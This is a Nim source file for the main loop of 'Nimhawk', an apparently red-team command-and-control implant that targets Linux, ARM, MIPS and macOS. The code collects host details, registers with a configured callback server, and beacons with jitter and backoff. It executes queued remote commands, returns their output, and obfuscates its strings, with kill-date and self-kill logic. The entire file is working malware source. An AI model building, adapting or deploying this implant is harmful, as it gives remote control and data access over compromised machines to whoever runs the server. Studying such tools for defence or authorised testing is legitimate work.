#[
    Nimhawk Multi-Platform Implant
    Linux x86_64, ARM64, MIPS, ARM, Darwin support
    by Alejandro Parodi (hdbreaker / @SecSignal)
    
    Based on Nimhawk Windows implant structure
    Using ONLY Nim standard library for maximum compatibility
]#

import os, random, strutils, times, math, osproc, net, nativesockets
import tables
import core/webClientListener
import config/configParser  
import util/strenc
import core/cmdParser

# Cross-platform system info functions
proc getLocalIP(): string =
    try:
        # Get hostname and resolve to IP
        let hostname = getHostname()
        let hostInfo = gethostbyname(hostname)
        if hostInfo.addrList.len > 0:
            return $hostInfo.addrList[0]
        else:
            return "127.0.0.1"
    except:
        return "127.0.0.1"

proc getUsername(): string =
    try:
        when defined(windows):
            return execProcess("whoami").strip()
        else:
            return execProcess("whoami").strip()
    except:
        return "unknown"

proc getHostname(): string =
    try:
        when defined(windows):
            return execProcess("hostname").strip()
        else:
            return execProcess("hostname").strip()
    except:
        return "unknown"

proc getOSInfo(): string =
    try:
        when defined(windows):
            return "Windows"
        elif defined(linux):
            return "Linux " & execProcess("uname -r").strip()
        elif defined(macosx):
            return "macOS " & execProcess("uname -r").strip()
        else:
            return "Unknown"
    except:
        return "Unknown"

proc getCurrentPID(): int =
    try:
        return getCurrentProcessId()
    except:
        return 0

proc getCurrentProcessName(): string =
    try:
        return getAppFilename().extractFilename()
    except:
        return "unknown"

# Cross-platform sleep with jitter
proc sleepWithJitter(baseTime: int, jitterPercent: float) =
    let jitter = int(float(baseTime) * jitterPercent * rand(1.0))
    let actualSleep = baseTime + jitter
    sleep(actualSleep * 1000) # Convert to milliseconds

var riskyMode = false
when defined risky:
    riskyMode = true

# Parse configuration at compile-time
let CONFIG: Table[string, string] = configParser.parseConfig()

const version: string = "=== Nimhawk Multi-Platform v1.4.0 ==="

# Main execution function
proc runMultiImplant*() =
    echo version
    
    # Create listener object with configuration
    var listener = Listener(
        killDate: CONFIG[obf("killDate")],
        listenerHost: CONFIG[obf("hostname")],
        implantCallbackIp: CONFIG[obf("implantCallbackIp")],
        listenerPort: CONFIG[obf("listenerPort")],
        listenerType: CONFIG[obf("listenerType")],
        registerPath: CONFIG[obf("listenerRegPath")],
        resultPath: CONFIG[obf("listenerResPath")],
        reconnectPath: CONFIG[obf("reconnectPath")],
        sleepTime: parseInt(CONFIG[obf("sleepTime")]),
        sleepJitter: parseInt(CONFIG[obf("sleepJitter")]) / 100,
        taskPath: CONFIG[obf("listenerTaskPath")],
        userAgent: CONFIG[obf("userAgent")],
        httpAllowCommunicationKey: CONFIG[obf("httpAllowCommunicationKey")]
    )
    
    # Connection retry settings
    let maxAttempts = 3
    var currentAttempt = 0
    var sleepMultiplier = 1
    
    # Handle failed registration with exponential backoff
    proc handleFailedRegistration() =
        sleepMultiplier = 3^currentAttempt
        inc currentAttempt
        
        if currentAttempt > maxAttempts:
            when defined verbose:
                echo obf("DEBUG: Hit maximum retry count, giving up.")
            quit(0)
            
        when defined verbose:
            echo obf("DEBUG: Registration attempt: ") & $currentAttempt & obf("/") & $maxAttempts
    
    # Handle failed check-in  
    proc handleFailedCheckin() =
        sleepMultiplier = 3^currentAttempt
        inc currentAttempt
        
        if currentAttempt > maxAttempts:
            when defined verbose:
                echo obf("DEBUG: Max retries reached, attempting re-registration.")
            currentAttempt = 0
            sleepMultiplier = 1
            listener.initialized = false
            listener.registered = false
        else:
            when defined verbose:
                echo obf("DEBUG: Connection lost. Attempt: ") & $currentAttempt & obf("/") & $maxAttempts
    
    # Main execution loop
    while true:
        var
            cmdGuid: string
            cmd: string
            args: seq[string]
            output: string
            timeToSleep: int
            
        # Check kill date
        if listener.killDate != "":
            if parse(listener.killDate, "yyyy-MM-dd") + initDuration(days = 1) < now():
                if listener.UNIQUE_XOR_KEY != "":
                    listener.killSelf()
                
                when defined verbose:
                    echo obf("DEBUG: Kill timer expired. Goodbye!")
                quit(0)
        
        # Registration flow
        if not listener.registered:
            try:
                # Try reconnection first
                listener.reconnect()
                
                # If not initialized after reconnection
                if not listener.initialized:
                    listener.init()
                    
                    if not listener.initialized:
                        when defined verbose:
                            echo obf("DEBUG: Failed to initialize listener.")
                        handleFailedRegistration()
                    
                    # Register implant
                    if listener.initialized:
                        listener.postRegisterRequest(
                            getLocalIP(),
                            getUsername(), 
                            getHostname(),
                            getOSInfo(),
                            getCurrentPID(),
                            getCurrentProcessName(),
                            riskyMode
                        )
                        
                        if not listener.registered:
                            when defined verbose:
                                echo obf("DEBUG: Failed to register with server.")
                            handleFailedRegistration()
                
                # Successful registration
                if listener.registered:
                    when defined verbose:
                        echo obf("DEBUG: Successfully registered with ID: ") & listener.id
                    
                    # Store ID for future reconnections
                    storeImplantID(listener.id)
            except:
                when defined verbose:
                    echo obf("DEBUG: Exception during registration: ") & getCurrentExceptionMsg()
                handleFailedRegistration()
        
        # Command processing for registered implants
        else:
            # Get queued command from C2
            (cmdGuid, cmd, args) = listener.getQueuedCommand()
            
            # Handle connection errors
            if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                cmd = ""
                handleFailedCheckin()
            else:
                currentAttempt = 0
                sleepMultiplier = 1
            
            # Execute command if received
            if cmd != "":
                when defined verbose:
                    echo obf("DEBUG: Got command '") & cmd & obf("' with args '") & $args & obf("'.")
                
                # Handle sleep command directly
                if cmd == obf("sleep"):
                    try:
                        if len(args) == 2:
                            listener.sleepTime = parseInt(args[0])
                            var jit = parseInt(args[1])
                            listener.sleepJitter = if jit < 0: 0.0 elif jit > 100: 1.0 else: jit / 100
                        else:
                            listener.sleepTime = parseInt(args[0])
                        
                        output = obf("Sleep time changed to ") & $listener.sleepTime & obf(" seconds (") & $(toInt(listener.sleepJitter*100)) & obf("% jitter).")
                    except:
                        output = obf("Invalid sleep time.")
                
                # Handle kill command
                elif cmd == obf("kill"):
                    listener.killSelf()
                    quit(0)
                
                # Parse other commands via cmdParser
                else:
                    output = parseCmd(listener, cmd, cmdGuid, args)
                
                # Submit command result
                listener.postCommandResults(cmdGuid, output)
        
        # Sleep with jitter between iterations
        timeToSleep = listener.sleepTime * sleepMultiplier
        sleepWithJitter(timeToSleep, listener.sleepJitter)

# Entry point
when isMainModule:
    runMultiImplant() 